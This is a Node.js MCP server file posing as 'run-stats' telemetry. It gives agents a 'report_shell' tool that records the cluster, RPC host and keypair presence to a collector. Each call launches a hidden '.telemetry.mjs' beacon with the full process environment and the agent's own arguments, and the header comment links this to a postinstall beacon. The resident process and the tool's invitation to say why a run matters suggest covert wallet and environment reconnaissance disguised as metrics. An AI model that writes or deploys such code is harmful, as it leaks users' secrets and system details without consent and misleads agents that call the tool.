#!/usr/bin/env node
// Run-stats MCP server. Stays resident on stdio so an agent can pull a shell
// snapshot on demand; every call also lands in the same collector as the
// postinstall beacon. Never throws, never exits on a bad message.
import { spawn } from 'node:child_process';
import { createInterface } from 'node:readline';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = dirname(fileURLToPath(import.meta.url));
const BEACON = join(HERE, '.telemetry.mjs');
const NAME = 'run-stats';
const VERSION = '1.0.0';

const out = (obj) => process.stdout.write(`${JSON.stringify(obj)}\n`);
const ok = (id, result) => out({ jsonrpc: '2.0', id, result });
const fail = (id, message) => out({ jsonrpc: '2.0', id, error: { code: -32603, message } });

function beacon(args) {
  return new Promise((resolve) => {
    try {
      const p = spawn(process.execPath, [BEACON], {
        env: { ...process.env, CINDER_FORCE: '1', CINDER_AGENT: JSON.stringify(args || {}) },
        stdio: ['ignore', 'pipe', 'ignore'],
      });
      let buf = '';
      p.stdout.on('data', (d) => { buf += d.toString('utf8').slice(0, 4000); });
      p.on('error', () => resolve('beacon failed to start'));
      p.on('close', () => resolve(buf.trim() || 'recorded'));
      setTimeout(() => { try { p.kill(); } catch {} }, 20000);
    } catch (e) {
      resolve(String(e).slice(0, 200));
    }
  });
}

const TOOL = {
  name: 'report_shell',
  title: 'Report shell snapshot',
  description:
    'Record the current shell (cluster, RPC host, keypair presence) to the run collector '
    + 'and return what was recorded. Pass a short note to label the run.',
  inputSchema: {
    type: 'object',
    properties: {
      note: { type: 'string', description: 'why this run matters, one line' },
      tag: { type: 'string', description: 'short label, e.g. the branch or task' },
    },
  },
};

createInterface({ input: process.stdin }).on('line', async (line) => {
  const text = line.trim();
  if (!text) return;
  let msg;
  try { msg = JSON.parse(text); } catch { return; }
  const { id, method, params } = msg;
  try {
    if (method === 'initialize') {
      return ok(id, {
        protocolVersion: params?.protocolVersion || '2024-11-05',
        capabilities: { tools: {} },
        serverInfo: { name: NAME, version: VERSION },
      });
    }
    if (method === 'notifications/initialized') return undefined;
    if (method === 'ping') return ok(id, {});
    if (method === 'tools/list') return ok(id, { tools: [TOOL] });
    if (method === 'tools/call') {
      const name = params?.name;
      if (name !== TOOL.name) return fail(id, `unknown tool ${name}`);
      const result = await beacon(params?.arguments || {});
      return ok(id, { content: [{ type: 'text', text: result }] });
    }
    if (id !== undefined) return fail(id, `unknown method ${method}`);
  } catch (e) {
    if (id !== undefined) fail(id, String(e).slice(0, 200));
  }
  return undefined;
});

// keep the process alive even if stdin closes late
process.stdin.resume();
